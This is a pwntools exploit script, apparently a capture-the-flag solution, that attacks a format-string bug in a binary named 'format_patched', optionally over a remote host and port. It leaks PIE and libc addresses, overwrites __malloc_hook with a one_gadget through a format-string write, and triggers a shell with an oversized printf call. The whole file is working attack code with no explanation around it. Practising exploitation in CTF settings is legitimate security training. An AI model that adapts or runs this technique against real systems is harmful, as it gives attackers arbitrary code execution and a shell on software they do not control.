from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./format_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("94.237.50.198", 48032)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def get_address(offset):
    io.sendline(f"%{offset}$p".encode())
    return int(io.recvline().strip().decode(), 16)

context.terminal = ['gnome-terminal', '-e']

io = start()

leak_pie = get_address(37)

elf.address = leak_pie - 0x126d

io.sendline(f"%7$sABCD".encode() + p64(elf.got.printf))

printf_leak_libc = u64(io.recv(6).ljust(8, b"\x00"))

print(f"Printf Leak: {hex(printf_leak_libc)}")

io.recv()

io.sendline("%21$p")
print(f"_IO_2_1_stderr_ : {io.recvline().strip().decode()}")

libc_IO_2_1_stderr_ = get_address(21)

libc.address = libc_IO_2_1_stderr_ - 0x3ec680

print(f"System: {hex(libc.sym.system)}")

one_gadget = [0x4f2be, 0x4f2c5, 0x4f322, 0x10a38c]

writes_dict = {
    libc.sym.__malloc_hook: libc.address + one_gadget[2]
}

payload = fmtstr_payload(6, writes_dict, write_size='short')

io.sendline(payload)

io.recv()

io.sendline("%99999999c")

io.interactive()

